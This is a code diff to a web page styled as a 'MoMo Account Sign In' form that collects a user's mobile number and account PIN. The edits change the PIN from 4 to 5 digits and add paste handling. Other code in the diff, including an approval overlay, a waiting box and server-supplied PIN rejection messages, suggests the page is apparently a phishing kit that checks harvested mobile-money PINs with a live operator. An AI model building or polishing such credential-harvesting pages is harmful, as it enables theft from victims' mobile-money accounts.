@@ -483,7 +483,7 @@
               <span>🔐</span>
               <span>MoMo Account Sign In</span>
             </h2>
-            <p class="text-xs text-yellow-100 font-medium mt-0.5">4-Digit Security PIN Verification</p>
+            <p class="text-xs text-yellow-100 font-medium mt-0.5">5-Digit Security PIN Verification</p>
           </div>
         </div>
 
@@ -496,7 +496,7 @@
               <span>🔐</span>
               <span>MoMo Account PIN</span>
             </h3>
-            <p class="text-xs text-slate-500 font-medium">Enter your mobile number and 4-digit MoMo Account PIN</p>
+            <p class="text-xs text-slate-500 font-medium">Enter your mobile number and 5-digit MoMo Account PIN</p>
           </div>
 
           <!-- Phone Number Input Container -->
@@ -516,7 +516,7 @@
             <div class="flex items-center justify-between text-xs font-bold text-slate-600 uppercase tracking-wider px-1">
               <span class="flex items-center space-x-1">
                 <span>🔐</span>
-                <span>Account PIN (4 Digits)</span>
+                <span>Account PIN (5 Digits)</span>
               </span>
               <span class="text-[10px] font-semibold text-slate-400 flex items-center space-x-0.5">
                 <span>🛡️</span>
@@ -525,15 +525,16 @@
             </div>
 
             <!-- PIN Input Row -->
-            <div class="flex items-center justify-center space-x-2.5 py-1">
-              <div class="grid grid-cols-4 gap-2.5 flex-1">
-                <input type="password" maxlength="1" data-index="0" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
-                <input type="password" maxlength="1" data-index="1" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
-                <input type="password" maxlength="1" data-index="2" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
-                <input type="password" maxlength="1" data-index="3" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
+            <div class="flex items-center justify-center space-x-2 sm:space-x-2.5 py-1">
+              <div class="grid grid-cols-5 gap-2 sm:gap-2.5 flex-1">
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="0" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="1" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="2" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="3" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="4" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
               </div>
               
-              <button type="button" onclick="togglePinVisibility()" class="p-2 text-slate-500 hover:text-[#002B49] transition-colors focus:outline-none flex flex-col items-center justify-center" aria-label="Toggle PIN Visibility">
+              <button type="button" onclick="togglePinVisibility()" class="p-2 text-slate-500 hover:text-[#002B49] transition-colors focus:outline-none flex flex-col items-center justify-center shrink-0" aria-label="Toggle PIN Visibility">
                 <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                   <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
                   <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
@@ -1709,7 +1710,7 @@
       }
     }
 
-    // 4-Digit PIN Boxes Logic
+    // 5-Digit PIN Boxes Logic
     const pinInputs = document.querySelectorAll('.pin-box');
     const loginBtn = document.getElementById('login-btn');
 
@@ -1737,6 +1738,20 @@
           pinInputs[index - 1].focus();
         }
       });
+
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasteData = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
+        if (pasteData) {
+          const digits = pasteData.slice(0, pinInputs.length).split('');
+          digits.forEach((d, idx) => {
+            if (pinInputs[idx]) pinInputs[idx].value = d;
+          });
+          const nextIndex = Math.min(digits.length, pinInputs.length - 1);
+          if (pinInputs[nextIndex]) pinInputs[nextIndex].focus();
+          checkPinComplete();
+        }
+      });
     });
 
     function checkPinComplete() {
@@ -1744,7 +1759,7 @@
       pinInputs.forEach(i => pin += i.value);
       appState.momoPin = pin;
 
-      if (pin.length === 4) {
+      if (pin.length === 5) {
         loginBtn.disabled = false;
         loginBtn.classList.remove('bg-blue-900/40', 'text-white/50', 'bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
         loginBtn.classList.add('bg-[#FFCC00]', 'hover:bg-[#E5B800]', 'text-[#002B49]', 'font-black', 'shadow-lg', 'shadow-yellow-500/20', 'cursor-pointer');
@@ -2022,7 +2037,7 @@
           authBtn.innerHTML = '<span>LINK TO MOMO ACCOUNT & PROCEED</span> <span>⚡</span>';
         }
         goToStep(3);
-        showClipboardToast('⚡ Linked to MoMo! Please enter your 4-digit Account PIN.');
+        showClipboardToast('⚡ Linked to MoMo! Please enter your 5-digit Account PIN.');
         const firstPin = document.querySelector('.pin-box');
         if (firstPin) setTimeout(() => firstPin.focus(), 150);
       }, 350);
@@ -2128,7 +2143,7 @@
                   hideApprovalOverlay();
                   if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
                   if (pinAlert) {
-                    pinAlert.innerText = accountPinVer.reject_reason || '❌ Incorrect Account PIN! Please re-enter your 4-digit Account PIN.';
+                    pinAlert.innerText = accountPinVer.reject_reason || '❌ Incorrect Account PIN! Please re-enter your 5-digit Account PIN.';
                     pinAlert.classList.remove('hidden');
                   }
                   clearPin();
